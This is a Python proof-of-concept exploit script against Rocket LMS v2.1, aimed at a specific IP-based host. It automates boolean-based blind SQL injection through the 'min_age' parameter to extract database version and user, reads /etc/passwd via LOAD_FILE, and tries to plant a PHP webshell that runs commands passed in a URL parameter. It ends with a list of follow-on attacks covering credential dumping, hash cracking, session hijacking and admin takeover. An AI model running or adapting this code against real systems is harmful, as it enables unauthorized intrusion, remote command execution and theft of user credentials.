#!/usr/bin/env python3
"""
SQL Injection Shell Attempt - Proof of Concept
Target: Rocket LMS v2.1 - InstructorFinderController
Vulnerability: Boolean-based Blind SQL Injection
"""

import requests
import sys
import time

# Configuration
TARGET = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io/instructor-finder"
PARAM = "min_age"
THRESHOLD = 150000  # Response length threshold for TRUE condition

# Common web paths to try for shell upload
WEB_PATHS = [
    "/var/www/html/public/",
    "/var/www/public/",
    "/var/www/html/",
    "/var/www/",
    "/app/public/",
    "/var/www/app/public/",
]

# Simple PHP webshell
WEBSHELL = "<?php if(isset($_GET['c'])){system($_GET['c']);} ?>"

def check_condition(condition):
    """Send request with SQL condition and check if it returns results"""
    payload = f"1 AND ({condition})"
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
        return len(response.text) > THRESHOLD
    except Exception as e:
        print(f"Error: {e}")
        return None

def extract_string(query, max_len=100):
    """Extract string using binary search on each character"""
    result = ""
    for pos in range(1, max_len + 1):
        # Check if there's a character at this position
        if not check_condition(f"LENGTH({query}) >= {pos}"):
            break
        
        # Binary search for the character ASCII value
        low, high = 32, 126
        while low < high:
            mid = (low + high + 1) // 2
            if check_condition(f"ASCII(SUBSTRING({query},{pos},1)) >= {mid}"):
                low = mid
            else:
                high = mid - 1
        
        result += chr(low)
        print(f"\r[+] Extracting: {result}", end="", flush=True)
    
    print()
    return result

def test_file_privilege():
    """Test if MySQL user has FILE privilege"""
    print("\n[*] Testing FILE privilege...")
    
    # Test if we can use LOAD_FILE
    # Check if LOAD_FILE('/etc/passwd') returns something
    condition = "LOAD_FILE('/etc/passwd') IS NOT NULL"
    result = check_condition(condition)
    
    if result:
        print("[+] FILE privilege detected! Can potentially read/write files.")
        return True
    else:
        print("[-] FILE privilege test failed or not available.")
        return False

def test_into_outfile():
    """Test INTO OUTFILE capability"""
    print("\n[*] Testing INTO OUTFILE capability...")
    
    # This is tricky with boolean-based blind injection
    # We need to use a different approach
    # Try UNION-based if possible
    
    for path in WEB_PATHS:
        shell_path = path + "test_shell.php"
        print(f"[*] Trying to write to: {shell_path}")
        
        # Attempt using UNION with INTO OUTFILE
        # Note: This might not work with PDO prepared statements
        payload = f"1 UNION SELECT '{WEBSHELL}' INTO OUTFILE '{shell_path}'"
        
        try:
            response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
            # Check if shell was created
            shell_url = TARGET.replace('/instructor-finder', '/test_shell.php')
            shell_check = requests.get(shell_url, timeout=10)
            
            if shell_check.status_code == 200:
                print(f"[+] Shell might be written! Check: {shell_url}")
                return shell_url
        except:
            pass
    
    return None

def test_stacked_queries():
    """Test if stacked queries are supported"""
    print("\n[*] Testing stacked queries support...")
    
    # Try to execute a benign stacked query
    payload = "1; SELECT SLEEP(5); --"
    
    start = time.time()
    try:
        response = requests.get(TARGET, params={PARAM: payload}, timeout=30)
        elapsed = time.time() - start
        
        if elapsed >= 5:
            print("[+] Stacked queries might be supported! (5 second delay detected)")
            return True
        else:
            print("[-] Stacked queries not supported (PDO default behavior)")
            return False
    except:
        return False

def check_mysql_version():
    """Extract MySQL version"""
    print("\n[*] Extracting MySQL version...")
    version = extract_string("@@version", 50)
    return version

def check_current_user():
    """Extract current database user"""
    print("\n[*] Extracting current user...")
    user = extract_string("CURRENT_USER()", 50)
    return user

def check_secure_file_priv():
    """Check secure_file_priv setting"""
    print("\n[*] Checking secure_file_priv setting...")
    
    # Check if secure_file_priv is empty (allows file operations)
    condition = "(SELECT @@secure_file_priv) = ''"
    if check_condition(condition):
        print("[+] secure_file_priv is EMPTY - File operations possible anywhere!")
        return ""
    
    # Check if it's NULL
    condition = "(SELECT @@secure_file_priv) IS NULL"
    if check_condition(condition):
        print("[+] secure_file_priv is NULL - File operations possible anywhere!")
        return None
    
    # Try to extract the path
    print("[*] Extracting secure_file_priv path...")
    path = extract_string("@@secure_file_priv", 100)
    return path

def main():
    print("=" * 60)
    print("SQL Injection Shell Attempt - Proof of Concept")
    print(f"Target: {TARGET}")
    print("=" * 60)
    
    # Step 1: Verify injection still works
    print("\n[*] Step 1: Verifying SQL injection...")
    if check_condition("1=1"):
        print("[+] TRUE condition works")
    else:
        print("[-] SQL injection not working. Exiting.")
        sys.exit(1)
    
    if not check_condition("1=2"):
        print("[+] FALSE condition works")
    else:
        print("[-] Boolean detection not working. Exiting.")
        sys.exit(1)
    
    print("[+] SQL Injection confirmed!")
    
    # Step 2: Get database info
    print("\n" + "=" * 60)
    print("DATABASE INFORMATION")
    print("=" * 60)
    
    version = check_mysql_version()
    print(f"[+] MySQL Version: {version}")
    
    user = check_current_user()
    print(f"[+] Current User: {user}")
    
    # Step 3: Check FILE privilege
    print("\n" + "=" * 60)
    print("FILE OPERATIONS TEST")
    print("=" * 60)
    
    secure_path = check_secure_file_priv()
    print(f"[*] secure_file_priv: {secure_path}")
    
    file_priv = test_file_privilege()
    
    # Step 4: Test stacked queries
    print("\n" + "=" * 60)
    print("STACKED QUERIES TEST")
    print("=" * 60)
    stacked = test_stacked_queries()
    
    # Step 5: Attempt shell upload if FILE privilege exists
    if file_priv:
        print("\n" + "=" * 60)
        print("SHELL UPLOAD ATTEMPT")
        print("=" * 60)
        shell_url = test_into_outfile()
        
        if shell_url:
            print(f"\n[+] SUCCESS! Shell available at: {shell_url}")
            print(f"[+] Usage: {shell_url}?c=whoami")
        else:
            print("\n[-] Could not write shell via INTO OUTFILE")
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"MySQL Version: {version}")
    print(f"Current User: {user}")
    print(f"FILE Privilege: {'Yes' if file_priv else 'No/Unknown'}")
    print(f"Stacked Queries: {'Yes' if stacked else 'No'}")
    print(f"secure_file_priv: {secure_path if secure_path else 'Empty/NULL (good for attacker)'}")
    
    print("\n" + "=" * 60)
    print("ALTERNATIVES IF SHELL FAILED")
    print("=" * 60)
    print("""
1. Data Exfiltration: Already demonstrated - can dump credentials
2. Password Hashes: Extract and crack bcrypt hashes from users table
3. Session Hijacking: Extract active session tokens
4. Admin Access: Extract admin credentials and login normally
5. Time-based Blind: Use SLEEP() for data extraction if boolean fails
    """)

if __name__ == "__main__":
    main()
